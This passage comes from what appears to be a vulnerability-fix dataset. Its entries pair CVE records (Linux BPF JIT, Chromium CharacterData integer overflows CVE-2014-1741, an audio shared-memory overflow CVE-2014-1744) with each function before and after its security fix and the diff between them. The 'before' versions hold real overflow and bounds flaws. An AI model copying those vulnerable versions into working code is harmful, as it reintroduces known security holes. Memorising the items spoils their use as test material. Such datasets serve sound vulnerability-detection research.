-1)\n\t\t\t\t\t\tpc_ret0 = i;\n\t\t\t\t\tCLEAR_A();\n\t\t\t\t} else {\n\t\t\t\t\tEMIT1_off32(0xb8, K);\t/* mov $imm32,%eax */\n\t\t\t\t}\n\t\t\t\t/* fallinto */\n\t\t\tcase BPF_S_RET_A:\n\t\t\t\tif (seen) {\n\t\t\t\t\tif (i != flen - 1) {\n\t\t\t\t\t\tEMIT_JMP(cleanup_addr - addrs[i]);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t\tif (seen & SEEN_XREG)\n\t\t\t\t\t\tEMIT4(0x48, 0x8b, 0x5d, 0xf8);  /* mov  -8(%rbp),%rbx */\n\t\t\t\t\tEMIT1(0xc9);\t\t/* leaveq */\n\t\t\t\t}\n\t\t\t\tEMIT1(0xc3);\t\t/* ret */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_MISC_TAX: /* X = A */\n\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\tEMIT2(0x89, 0xc3);\t/* mov    %eax,%ebx */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_MISC_TXA: /* A = X */\n\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\tEMIT2(0x89, 0xd8);\t/* mov    %ebx,%eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_LD_IMM: /* A = K */\n\t\t\t\tif (!K)\n\t\t\t\t\tCLEAR_A();\n\t\t\t\telse\n\t\t\t\t\tEMIT1_off32(0xb8, K); /* mov $imm32,%eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_LDX_IMM: /* X = K */\n\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\tif (!K)\n\t\t\t\t\tCLEAR_X();\n\t\t\t\telse\n\t\t\t\t\tEMIT1_off32(0xbb, K); /* mov $imm32,%ebx */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_LD_MEM: /* A = mem[K] : mov off8(%rbp),%eax */\n\t\t\t\tseen |= SEEN_MEM;\n\t\t\t\tEMIT3(0x8b, 0x45, 0xf0 - K*4);\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_LDX_MEM: /* X = mem[K] : mov off8(%rbp),%ebx */\n\t\t\t\tseen |= SEEN_XREG | SEEN_MEM;\n\t\t\t\tEMIT3(0x8b, 0x5d, 0xf0 - K*4);\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ST: /* mem[K] = A : mov %eax,off8(%rbp) */\n\t\t\t\tseen |= SEEN_MEM;\n\t\t\t\tEMIT3(0x89, 0x45, 0xf0 - K*4);\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_STX: /* mem[K] = X : mov %ebx,off8(%rbp) */\n\t\t\t\tseen |= SEEN_XREG | SEEN_MEM;\n\t\t\t\tEMIT3(0x89, 0x5d, 0xf0 - K*4);\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_LD_W_LEN: /*\tA = skb->len; */\n\t\t\t\tBUILD_BUG_ON(FIELD_SIZEOF(struct sk_buff, len) != 4);\n\t\t\t\tif (is_imm8(offsetof(struct sk_buff, len)))\n\t\t\t\t\t/* mov    off8(%rdi),%eax */\n\t\t\t\t\tEMIT3(0x8b, 0x47, offsetof(struct sk_buff, len));\n\t\t\t\telse {\n\t\t\t\t\tEMIT2(0x8b, 0x87);\n\t\t\t\t\tEMIT(offsetof(struct sk_buff, len), 4);\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_LDX_W_LEN: /* X = skb->len; */\n\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\tif (is_imm8(offsetof(struct sk_buff, len)))\n\t\t\t\t\t/* mov off8(%rdi),%ebx */\n\t\t\t\t\tEMIT3(0x8b, 0x5f, offsetof(struct sk_buff, len));\n\t\t\t\telse {\n\t\t\t\t\tEMIT2(0x8b, 0x9f);\n\t\t\t\t\tEMIT(offsetof(struct sk_buff, len), 4);\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ANC_PROTOCOL: /* A = ntohs(skb->protocol); */\n\t\t\t\tBUILD_BUG_ON(FIELD_SIZEOF(struct sk_buff, protocol) != 2);\n\t\t\t\tif (is_imm8(offsetof(struct sk_buff, protocol))) {\n\t\t\t\t\t/* movzwl off8(%rdi),%eax */\n\t\t\t\t\tEMIT4(0x0f, 0xb7, 0x47, offsetof(struct sk_buff, protocol));\n\t\t\t\t} else {\n\t\t\t\t\tEMIT3(0x0f, 0xb7, 0x87); /* movzwl off32(%rdi),%eax */\n\t\t\t\t\tEMIT(offsetof(struct sk_buff, protocol), 4);\n\t\t\t\t}\n\t\t\t\tEMIT2(0x86, 0xc4); /* ntohs() : xchg   %al,%ah */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ANC_IFINDEX:\n\t\t\t\tif (is_imm8(offsetof(struct sk_buff, dev))) {\n\t\t\t\t\t/* movq off8(%rdi),%rax */\n\t\t\t\t\tEMIT4(0x48, 0x8b, 0x47, offsetof(struct sk_buff, dev));\n\t\t\t\t} else {\n\t\t\t\t\tEMIT3(0x48, 0x8b, 0x87); /* movq off32(%rdi),%rax */\n\t\t\t\t\tEMIT(offsetof(struct sk_buff, dev), 4);\n\t\t\t\t}\n\t\t\t\tEMIT3(0x48, 0x85, 0xc0);\t/* test %rax,%rax */\n\t\t\t\tEMIT_COND_JMP(X86_JE, cleanup_addr - (addrs[i] - 6));\n\t\t\t\tBUILD_BUG_ON(FIELD_SIZEOF(struct net_device, ifindex) != 4);\n\t\t\t\tEMIT2(0x8b, 0x80);\t/* mov off32(%rax),%eax */\n\t\t\t\tEMIT(offsetof(struct net_device, ifindex), 4);\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ANC_MARK:\n\t\t\t\tBUILD_BUG_ON(FIELD_SIZEOF(struct sk_buff, mark) != 4);\n\t\t\t\tif (is_imm8(offsetof(struct sk_buff, mark))) {\n\t\t\t\t\t/* mov off8(%rdi),%eax */\n\t\t\t\t\tEMIT3(0x8b, 0x47, offsetof(struct sk_buff, mark));\n\t\t\t\t} else {\n\t\t\t\t\tEMIT2(0x8b, 0x87);\n\t\t\t\t\tEMIT(offsetof(struct sk_buff, mark), 4);\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ANC_RXHASH:\n\t\t\t\tBUILD_BUG_ON(FIELD_SIZEOF(struct sk_buff, rxhash) != 4);\n\t\t\t\tif (is_imm8(offsetof(struct sk_buff, rxhash))) {\n\t\t\t\t\t/* mov off8(%rdi),%eax */\n\t\t\t\t\tEMIT3(0x8b, 0x47, offsetof(struct sk_buff, rxhash));\n\t\t\t\t} else {\n\t\t\t\t\tEMIT2(0x8b, 0x87);\n\t\t\t\t\tEMIT(offsetof(struct sk_buff, rxhash), 4);\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ANC_QUEUE:\n\t\t\t\tBUILD_BUG_ON(FIELD_SIZEOF(struct sk_buff, queue_mapping) != 2);\n\t\t\t\tif (is_imm8(offsetof(struct sk_buff, queue_mapping))) {\n\t\t\t\t\t/* movzwl off8(%rdi),%eax */\n\t\t\t\t\tEMIT4(0x0f, 0xb7, 0x47, offsetof(struct sk_buff, queue_mapping));\n\t\t\t\t} else {\n\t\t\t\t\tEMIT3(0x0f, 0xb7, 0x87); /* movzwl off32(%rdi),%eax */\n\t\t\t\t\tEMIT(offsetof(struct sk_buff, queue_mapping), 4);\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ANC_CPU:\n#ifdef CONFIG_SMP\n\t\t\t\tEMIT4(0x65, 0x8b, 0x04, 0x25); /* mov %gs:off32,%eax */\n\t\t\t\tEMIT((u32)(unsigned long)&cpu_number, 4); /* A = smp_processor_id(); */\n#else\n\t\t\t\tCLEAR_A();\n#endif\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_LD_W_ABS:\n\t\t\t\tfunc = sk_load_word;\ncommon_load:\t\t\tseen |= SEEN_DATAREF;\n\t\t\t\tif ((int)K < 0)\n\t\t\t\t\tgoto out;\n\t\t\t\tt_offset = func - (image + addrs[i]);\n\t\t\t\tEMIT1_off32(0xbe, K); /* mov imm32,%esi */\n\t\t\t\tEMIT1_off32(0xe8, t_offset); /* call */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_LD_H_ABS:\n\t\t\t\tfunc = sk_load_half;\n\t\t\t\tgoto common_load;\n\t\t\tcase BPF_S_LD_B_ABS:\n\t\t\t\tfunc = sk_load_byte;\n\t\t\t\tgoto common_load;\n\t\t\tcase BPF_S_LDX_B_MSH:\n\t\t\t\tif ((int)K < 0) {\n\t\t\t\t\tif (pc_ret0 != -1) {\n\t\t\t\t\t\tEMIT_JMP(addrs[pc_ret0] - addrs[i]);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t\tCLEAR_A();\n\t\t\t\t\tEMIT_JMP(cleanup_addr - addrs[i]);\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tseen |= SEEN_DATAREF | SEEN_XREG;\n\t\t\t\tt_offset = sk_load_byte_msh - (image + addrs[i]);\n\t\t\t\tEMIT1_off32(0xbe, K);\t/* mov imm32,%esi */\n\t\t\t\tEMIT1_off32(0xe8, t_offset); /* call sk_load_byte_msh */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_LD_W_IND:\n\t\t\t\tfunc = sk_load_word_ind;\ncommon_load_ind:\t\tseen |= SEEN_DATAREF | SEEN_XREG;\n\t\t\t\tt_offset = func - (image + addrs[i]);\n\t\t\t\tEMIT1_off32(0xbe, K);\t/* mov imm32,%esi   */\n\t\t\t\tEMIT1_off32(0xe8, t_offset);\t/* call sk_load_xxx_ind */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_LD_H_IND:\n\t\t\t\tfunc = sk_load_half_ind;\n\t\t\t\tgoto common_load_ind;\n\t\t\tcase BPF_S_LD_B_IND:\n\t\t\t\tfunc = sk_load_byte_ind;\n\t\t\t\tgoto common_load_ind;\n\t\t\tcase BPF_S_JMP_JA:\n\t\t\t\tt_offset = addrs[i + K] - addrs[i];\n\t\t\t\tEMIT_JMP(t_offset);\n\t\t\t\tbreak;\n\t\t\tCOND_SEL(BPF_S_JMP_JGT_K, X86_JA, X86_JBE);\n\t\t\tCOND_SEL(BPF_S_JMP_JGE_K, X86_JAE, X86_JB);\n\t\t\tCOND_SEL(BPF_S_JMP_JEQ_K, X86_JE, X86_JNE);\n\t\t\tCOND_SEL(BPF_S_JMP_JSET_K,X86_JNE, X86_JE);\n\t\t\tCOND_SEL(BPF_S_JMP_JGT_X, X86_JA, X86_JBE);\n\t\t\tCOND_SEL(BPF_S_JMP_JGE_X, X86_JAE, X86_JB);\n\t\t\tCOND_SEL(BPF_S_JMP_JEQ_X, X86_JE, X86_JNE);\n\t\t\tCOND_SEL(BPF_S_JMP_JSET_X,X86_JNE, X86_JE);\n\ncond_branch:\t\t\tf_offset = addrs[i + filter[i].jf] - addrs[i];\n\t\t\t\tt_offset = addrs[i + filter[i].jt] - addrs[i];\n\n\t\t\t\t/* same targets, can avoid doing the test :) */\n\t\t\t\tif (filter[i].jt == filter[i].jf) {\n\t\t\t\t\tEMIT_JMP(t_offset);\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\n\t\t\t\tswitch (filter[i].code) {\n\t\t\t\tcase BPF_S_JMP_JGT_X:\n\t\t\t\tcase BPF_S_JMP_JGE_X:\n\t\t\t\tcase BPF_S_JMP_JEQ_X:\n\t\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\t\tEMIT2(0x39, 0xd8); /* cmp %ebx,%eax */\n\t\t\t\t\tbreak;\n\t\t\t\tcase BPF_S_JMP_JSET_X:\n\t\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\t\tEMIT2(0x85, 0xd8); /* test %ebx,%eax */\n\t\t\t\t\tbreak;\n\t\t\t\tcase BPF_S_JMP_JEQ_K:\n\t\t\t\t\tif (K == 0) {\n\t\t\t\t\t\tEMIT2(0x85, 0xc0); /* test   %eax,%eax */\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\tcase BPF_S_JMP_JGT_K:\n\t\t\t\tcase BPF_S_JMP_JGE_K:\n\t\t\t\t\tif (K <= 127)\n\t\t\t\t\t\tEMIT3(0x83, 0xf8, K); /* cmp imm8,%eax */\n\t\t\t\t\telse\n\t\t\t\t\t\tEMIT1_off32(0x3d, K); /* cmp imm32,%eax */\n\t\t\t\t\tbreak;\n\t\t\t\tcase BPF_S_JMP_JSET_K:\n\t\t\t\t\tif (K <= 0xFF)\n\t\t\t\t\t\tEMIT2(0xa8, K); /* test imm8,%al */\n\t\t\t\t\telse if (!(K & 0xFFFF00FF))\n\t\t\t\t\t\tEMIT3(0xf6, 0xc4, K >> 8); /* test imm8,%ah */\n\t\t\t\t\telse if (K <= 0xFFFF) {\n\t\t\t\t\t\tEMIT2(0x66, 0xa9); /* test imm16,%ax */\n\t\t\t\t\t\tEMIT(K, 2);\n\t\t\t\t\t} else {\n\t\t\t\t\t\tEMIT1_off32(0xa9, K); /* test imm32,%eax */\n\t\t\t\t\t}\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tif (filter[i].jt != 0) {\n\t\t\t\t\tif (filter[i].jf && f_offset)\n\t\t\t\t\t\tt_offset += is_near(f_offset) ? 2 : 5;\n\t\t\t\t\tEMIT_COND_JMP(t_op, t_offset);\n\t\t\t\t\tif (filter[i].jf)\n\t\t\t\t\t\tEMIT_JMP(f_offset);\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tEMIT_COND_JMP(f_op, f_offset);\n\t\t\t\tbreak;\n\t\t\tdefault:\n\t\t\t\t/* hmm, too complex filter, give up with jit compiler */\n\t\t\t\tgoto out;\n\t\t\t}\n\t\t\tilen = prog - temp;\n\t\t\tif (image) {\n\t\t\t\tif (unlikely(proglen + ilen > oldproglen)) {\n\t\t\t\t\tpr_err(\"bpb_jit_compile fatal error\\n\");\n\t\t\t\t\tkfree(addrs);\n\t\t\t\t\tmodule_free(NULL, image);\n\t\t\t\t\treturn;\n\t\t\t\t}\n\t\t\t\tmemcpy(image + proglen, temp, ilen);\n\t\t\t}\n\t\t\tproglen += ilen;\n\t\t\taddrs[i] = proglen;\n\t\t\tprog = temp;\n\t\t}\n\t\t/* last bpf instruction is always a RET :\n\t\t * use it to give the cleanup instruction(s) addr\n\t\t */\n\t\tcleanup_addr = proglen - 1; /* ret */\n\t\tif (seen)\n\t\t\tcleanup_addr -= 1; /* leaveq */\n\t\tif (seen & SEEN_XREG)\n\t\t\tcleanup_addr -= 4; /* mov  -8(%rbp),%rbx */\n\n\t\tif (image) {\n\t\t\tWARN_ON(proglen != oldproglen);\n\t\t\tbreak;\n\t\t}\n\t\tif (proglen == oldproglen) {\n\t\t\timage = module_alloc(max_t(unsigned int,\n\t\t\t\t\t\t   proglen,\n\t\t\t\t\t\t   sizeof(struct work_struct)));\n\t\t\tif (!image)\n\t\t\t\tgoto out;\n\t\t}\n\t\toldproglen = proglen;\n\t}\n\tif (bpf_jit_enable > 1)\n\t\tpr_err(\"flen=%d proglen=%u pass=%d image=%p\\n\",\n\t\t       flen, proglen, pass, image);\n\n\tif (image) {\n\t\tif (bpf_jit_enable > 1)\n\t\t\tprint_hex_dump(KERN_ERR, \"JIT code: \", DUMP_PREFIX_ADDRESS,\n\t\t\t\t       16, 1, image, proglen, false);\n\n\t\tbpf_flush_icache(image, image + proglen);\n\n\t\tfp->bpf_func = (void *)image;\n\t}\nout:\n\tkfree(addrs);\n\treturn;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -448,8 +448,8 @@\n \t\t\t\t\tbreak;\n \t\t\t\t}\n \t\t\t\tif (filter[i].jt != 0) {\n-\t\t\t\t\tif (filter[i].jf)\n-\t\t\t\t\t\tt_offset += is_near(f_offset) ? 2 : 6;\n+\t\t\t\t\tif (filter[i].jf && f_offset)\n+\t\t\t\t\t\tt_offset += is_near(f_offset) ? 2 : 5;\n \t\t\t\t\tEMIT_COND_JMP(t_op, t_offset);\n \t\t\t\t\tif (filter[i].jf)\n \t\t\t\t\t\tEMIT_JMP(f_offset);",
        "diff_line_info": {
            "deleted_lines": [
                "\t\t\t\t\tif (filter[i].jf)",
                "\t\t\t\t\t\tt_offset += is_near(f_offset) ? 2 : 6;"
            ],
            "added_lines": [
                "\t\t\t\t\tif (filter[i].jf && f_offset)",
                "\t\t\t\t\t\tt_offset += is_near(f_offset) ? 2 : 5;"
            ]
        }
    },
    {
        "cve_id": "CVE-2014-1741",
        "func_name": "chromium/updatePositionAfterAdoptingTextReplacement",
        "description": "Multiple integer overflows in the replace-data functionality in the CharacterData interface implementation in core/dom/CharacterData.cpp in Blink, as used in Google Chrome before 34.0.1847.137, allow remote attackers to cause a denial of service or possibly have unspecified other impact via vectors related to ranges.",
        "git_url": "https://github.com/chromium/chromium/commit/ed1bc278b276d660b5b80884dc9a655b0a17d258",
        "commit_title": "Add CharacterData.deleteData()/replaceData() overflow handling.",
        "commit_text": " If the offset and count exceed the underlying length, the spec tells us    http://dom.spec.whatwg.org/#concept-cd-replace (step 3)  to use a count that is equal to length minus the offset. Perform that check in an overflow-sensitive manner.  (Change based on https://codereview.chromium.org/188693007/ )   ",
        "func_before": "static Position updatePositionAfterAdoptingTextReplacement(const Position& position, CharacterData* node, unsigned offset, unsigned oldLength, unsigned newLength)\n{\n    if (!position.anchorNode() || position.anchorNode() != node || position.anchorType() != Position::PositionIsOffsetInAnchor)\n        return position;\n\n    // See: http://www.w3.org/TR/DOM-Level-2-Traversal-Range/ranges.html#Level-2-Range-Mutation\n    ASSERT(position.offsetInContainerNode() >= 0);\n    unsigned positionOffset = static_cast<unsigned>(position.offsetInContainerNode());\n    // Replacing text can be viewed as a deletion followed by insertion.\n    if (positionOffset >= offset && positionOffset <= offset + oldLength)\n        positionOffset = offset;\n\n    // Adjust the offset if the position is after the end of the deleted contents\n    // (positionOffset > offset + oldLength) to avoid having a stale offset.\n    if (positionOffset > offset + oldLength)\n        positionOffset = positionOffset - oldLength + newLength;\n\n    ASSERT(positionOffset <= node->length());\n    // CharacterNode in VisibleSelection must be Text node, because Comment\n    // and ProcessingInstruction node aren't visible.\n    return Position(toText(node), positionOffset);\n}",
        "func": "static Position updatePositionAfterAdoptingTextReplacement(const Position& position, CharacterData* node, unsigned offset, unsigned oldLength, unsigned newLength)\n{\n    if (!position.anchorNode() || position.anchorNode() != node || position.anchorType() != Position::PositionIsOffsetInAnchor)\n        return position;\n\n    // See: http://www.w3.org/TR/DOM-Level-2-Traversal-Range/ranges.html#Level-2-Range-Mutation\n    ASSERT(position.offsetInContainerNode() >= 0);\n    unsigned positionOffset = static_cast<unsigned>(position.offsetInContainerNode());\n    // Replacing text can be viewed as a deletion followed by insertion.\n    if (positionOffset >= offset && positionOffset <= offset + oldLength)\n        positionOffset = offset;\n\n    // Adjust the offset if the position is after the end of the deleted contents\n    // (positionOffset > offset + oldLength) to avoid having a stale offset.\n    if (positionOffset > offset + oldLength)\n        positionOffset = positionOffset - oldLength + newLength;\n\n    ASSERT_WITH_SECURITY_IMPLICATION(positionOffset <= node->length());\n    // CharacterNode in VisibleSelection must be Text node, because Comment\n    // and ProcessingInstruction node aren't visible.\n    return Position(toText(node), positionOffset);\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -15,7 +15,7 @@\n     if (positionOffset > offset + oldLength)\n         positionOffset = positionOffset - oldLength + newLength;\n \n-    ASSERT(positionOffset <= node->length());\n+    ASSERT_WITH_SECURITY_IMPLICATION(positionOffset <= node->length());\n     // CharacterNode in VisibleSelection must be Text node, because Comment\n     // and ProcessingInstruction node aren't visible.\n     return Position(toText(node), positionOffset);",
        "diff_line_info": {
            "deleted_lines": [
                "    ASSERT(positionOffset <= node->length());"
            ],
            "added_lines": [
                "    ASSERT_WITH_SECURITY_IMPLICATION(positionOffset <= node->length());"
            ]
        }
    },
    {
        "cve_id": "CVE-2014-1741",
        "func_name": "chromium/CharacterData::deleteData",
        "description": "Multiple integer overflows in the replace-data functionality in the CharacterData interface implementation in core/dom/CharacterData.cpp in Blink, as used in Google Chrome before 34.0.1847.137, allow remote attackers to cause a denial of service or possibly have unspecified other impact via vectors related to ranges.",
        "git_url": "https://github.com/chromium/chromium/commit/ed1bc278b276d660b5b80884dc9a655b0a17d258",
        "commit_title": "Add CharacterData.deleteData()/replaceData() overflow handling.",
        "commit_text": " If the offset and count exceed the underlying length, the spec tells us    http://dom.spec.whatwg.org/#concept-cd-replace (step 3)  to use a count that is equal to length minus the offset. Perform that check in an overflow-sensitive manner.  (Change based on https://codereview.chromium.org/188693007/ )   ",
        "func_before": "void CharacterData::deleteData(unsigned offset, unsigned count, ExceptionState& exceptionState, RecalcStyleBehavior recalcStyleBehavior)\n{\n    if (offset > length()) {\n        exceptionState.throwDOMException(IndexSizeError, \"The offset \" + String::number(offset) + \" is greater than the node's length (\" + String::number(length()) + \").\");\n        return;\n    }\n\n    unsigned realCount;\n    if (offset + count > length())\n        realCount = length() - offset;\n    else\n        realCount = count;\n\n    String newStr = m_data;\n    newStr.remove(offset, realCount);\n\n    setDataAndUpdate(newStr, offset, count, 0, recalcStyleBehavior);\n\n    document().didRemoveText(this, offset, realCount);\n}",
        "func": "void CharacterData::deleteData(unsigned offset, unsigned count, ExceptionState& exceptionState, RecalcStyleBehavior recalcStyleBehavior)\n{\n    unsigned realCount;\n    if (!validateOffsetCount(offset, count, length(), realCount, exceptionState))\n        return;\n\n    String newStr = m_data;\n    newStr.remove(offset, realCount);\n\n    setDataAndUpdate(newStr, offset, realCount, 0, recalcStyleBehavior);\n\n    document().didRemoveText(this, offset, realCount);\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -1,20 +1,13 @@\n void CharacterData::deleteData(unsigned offset, unsigned count, ExceptionState& exceptionState, RecalcStyleBehavior recalcStyleBehavior)\n {\n-    if (offset > length()) {\n-        exceptionState.throwDOMException(IndexSizeError, \"The offset \" + String::number(offset) + \" is greater than the node's length (\" + String::number(length()) + \").\");\n+    unsigned realCount;\n+    if (!validateOffsetCount(offset, count, length(), realCount, exceptionState))\n         return;\n-    }\n-\n-    unsigned realCount;\n-    if (offset + count > length())\n-        realCount = length() - offset;\n-    else\n-        realCount = count;\n \n     String newStr = m_data;\n     newStr.remove(offset, realCount);\n \n-    setDataAndUpdate(newStr, offset, count, 0, recalcStyleBehavior);\n+    setDataAndUpdate(newStr, offset, realCount, 0, recalcStyleBehavior);\n \n     document().didRemoveText(this, offset, realCount);\n }",
        "diff_line_info": {
            "deleted_lines": [
                "    if (offset > length()) {",
                "        exceptionState.throwDOMException(IndexSizeError, \"The offset \" + String::number(offset) + \" is greater than the node's length (\" + String::number(length()) + \").\");",
                "    }",
                "",
                "    unsigned realCount;",
                "    if (offset + count > length())",
                "        realCount = length() - offset;",
                "    else",
                "        realCount = count;",
                "    setDataAndUpdate(newStr, offset, count, 0, recalcStyleBehavior);"
            ],
            "added_lines": [
                "    unsigned realCount;",
                "    if (!validateOffsetCount(offset, count, length(), realCount, exceptionState))",
                "    setDataAndUpdate(newStr, offset, realCount, 0, recalcStyleBehavior);"
            ]
        }
    },
    {
        "cve_id": "CVE-2014-1741",
        "func_name": "chromium/CharacterData::replaceData",
        "description": "Multiple integer overflows in the replace-data functionality in the CharacterData interface implementation in core/dom/CharacterData.cpp in Blink, as used in Google Chrome before 34.0.1847.137, allow remote attackers to cause a denial of service or possibly have unspecified other impact via vectors related to ranges.",
        "git_url": "https://github.com/chromium/chromium/commit/ed1bc278b276d660b5b80884dc9a655b0a17d258",
        "commit_title": "Add CharacterData.deleteData()/replaceData() overflow handling.",
        "commit_text": " If the offset and count exceed the underlying length, the spec tells us    http://dom.spec.whatwg.org/#concept-cd-replace (step 3)  to use a count that is equal to length minus the offset. Perform that check in an overflow-sensitive manner.  (Change based on https://codereview.chromium.org/188693007/ )   ",
        "func_before": "void CharacterData::replaceData(unsigned offset, unsigned count, const String& data, ExceptionState& exceptionState)\n{\n    if (offset > length()) {\n        exceptionState.throwDOMException(IndexSizeError, \"The offset \" + String::number(offset) + \" is greater than the node's length (\" + String::number(length()) + \").\");\n        return;\n    }\n\n    unsigned realCount;\n    if (offset + count > length())\n        realCount = length() - offset;\n    else\n        realCount = count;\n\n    String newStr = m_data;\n    newStr.remove(offset, realCount);\n    newStr.insert(data, offset);\n\n    setDataAndUpdate(newStr, offset, count, data.length());\n\n    // update the markers for spell checking and grammar checking\n    document().didRemoveText(this, offset, realCount);\n    document().didInsertText(this, offset, data.length());\n}",
        "func": "void CharacterData::replaceData(unsigned offset, unsigned count, const String& data, ExceptionState& exceptionState)\n{\n    unsigned realCount;\n    if (!validateOffsetCount(offset, count, length(), realCount, exceptionState))\n        return;\n\n    String newStr = m_data;\n    newStr.remove(offset, realCount);\n    newStr.insert(data, offset);\n\n    setDataAndUpdate(newStr, offset, realCount, data.length());\n\n    // update the markers for spell checking and grammar checking\n    document().didRemoveText(this, offset, realCount);\n    document().didInsertText(this, offset, data.length());\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -1,21 +1,14 @@\n void CharacterData::replaceData(unsigned offset, unsigned count, const String& data, ExceptionState& exceptionState)\n {\n-    if (offset > length()) {\n-        exceptionState.throwDOMException(IndexSizeError, \"The offset \" + String::number(offset) + \" is greater than the node's length (\" + String::number(length()) + \").\");\n+    unsigned realCount;\n+    if (!validateOffsetCount(offset, count, length(), realCount, exceptionState))\n         return;\n-    }\n-\n-    unsigned realCount;\n-    if (offset + count > length())\n-        realCount = length() - offset;\n-    else\n-        realCount = count;\n \n     String newStr = m_data;\n     newStr.remove(offset, realCount);\n     newStr.insert(data, offset);\n \n-    setDataAndUpdate(newStr, offset, count, data.length());\n+    setDataAndUpdate(newStr, offset, realCount, data.length());\n \n     // update the markers for spell checking and grammar checking\n     document().didRemoveText(this, offset, realCount);",
        "diff_line_info": {
            "deleted_lines": [
                "    if (offset > length()) {",
                "        exceptionState.throwDOMException(IndexSizeError, \"The offset \" + String::number(offset) + \" is greater than the node's length (\" + String::number(length()) + \").\");",
                "    }",
                "",
                "    unsigned realCount;",
                "    if (offset + count > length())",
                "        realCount = length() - offset;",
                "    else",
                "        realCount = count;",
                "    setDataAndUpdate(newStr, offset, count, data.length());"
            ],
            "added_lines": [
                "    unsigned realCount;",
                "    if (!validateOffsetCount(offset, count, length(), realCount, exceptionState))",
                "    setDataAndUpdate(newStr, offset, realCount, data.length());"
            ]
        }
    },
    {
        "cve_id": "CVE-2014-1744",
        "func_name": "chromium/AudioInputRendererHost::OnCreateStream",
        "description": "Integer overflow in the AudioInputRendererHost::OnCreateStream function in content/browser/renderer_host/media/audio_input_renderer_host.cc in Google Chrome before 35.0.1916.114 allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors that trigger a large shared-memory allocation.",
        "git_url": "https://github.com/chromium/chromium/commit/223bb3e377e68427087569142cd72c18be28e114",
        "commit_title": "Check shared memory size before allocating it.",
        "commit_text": " This will prevent overflow from multiplication.   ",
        "func_before": "void AudioInputRendererHost::OnCreateStream(\n    int stream_id,\n    int render_view_id,\n    int session_id,\n    const AudioInputHostMsg_CreateStream_Config& config) {\n  DCHECK_CURRENTLY_ON(BrowserThread::IO);\n\n  DVLOG(1) << \"AudioInputRendererHost@\" << this\n           << \"::OnCreateStream(stream_id=\" << stream_id\n           << \", render_view_id=\" << render_view_id\n           << \", session_id=\" << session_id << \")\";\n  DCHECK_GT(render_view_id, 0);\n\n  // media::AudioParameters is validated in the deserializer.\n  if (LookupById(stream_id) != NULL) {\n    SendErrorMessage(stream_id, STREAM_ALREADY_EXISTS);\n    return;\n  }\n\n  media::AudioParameters audio_params(config.params);\n  if (media_stream_manager_->audio_input_device_manager()->\n      ShouldUseFakeDevice()) {\n    audio_params.Reset(\n        media::AudioParameters::AUDIO_FAKE,\n        config.params.channel_layout(), config.params.channels(), 0,\n        config.params.sample_rate(), config.params.bits_per_sample(),\n        config.params.frames_per_buffer());\n  }\n\n  // Check if we have the permission to open the device and which device to use.\n  std::string device_id = media::AudioManagerBase::kDefaultDeviceId;\n  if (audio_params.format() != media::AudioParameters::AUDIO_FAKE) {\n    const StreamDeviceInfo* info = media_stream_manager_->\n        audio_input_device_manager()->GetOpenedDeviceInfoById(session_id);\n    if (!info) {\n      SendErrorMessage(stream_id, PERMISSION_DENIED);\n      DLOG(WARNING) << \"No permission has been granted to input stream with \"\n                    << \"session_id=\" << session_id;\n      return;\n    }\n\n    device_id = info->device.id;\n  }\n\n  // Create a new AudioEntry structure.\n  scoped_ptr<AudioEntry> entry(new AudioEntry());\n\n  const uint32 segment_size = (sizeof(media::AudioInputBufferParameters) +\n                               audio_params.GetBytesPerBuffer());\n  entry->shared_memory_segment_count = config.shared_memory_count;\n\n  // Create the shared memory and share it with the renderer process\n  // using a new SyncWriter object.\n  if (!entry->shared_memory.CreateAndMapAnonymous(\n      segment_size * entry->shared_memory_segment_count)) {\n    // If creation of shared memory failed then send an error message.\n    SendErrorMessage(stream_id, SHARED_MEMORY_CREATE_FAILED);\n    return;\n  }\n\n  scoped_ptr<AudioInputSyncWriter> writer(\n      new AudioInputSyncWriter(&entry->shared_memory,\n                               entry->shared_memory_segment_count));\n\n  if (!writer->Init()) {\n    SendErrorMessage(stream_id, SYNC_WRITER_INIT_FAILED);\n    return;\n  }\n\n  // If we have successfully created the SyncWriter then assign it to the\n  // entry and construct an AudioInputController.\n  entry->writer.reset(writer.release());\n  if (WebContentsCaptureUtil::IsWebContentsDeviceId(device_id)) {\n    entry->controller = media::AudioInputController::CreateForStream(\n        audio_manager_->GetTaskRunner(),\n        this,\n        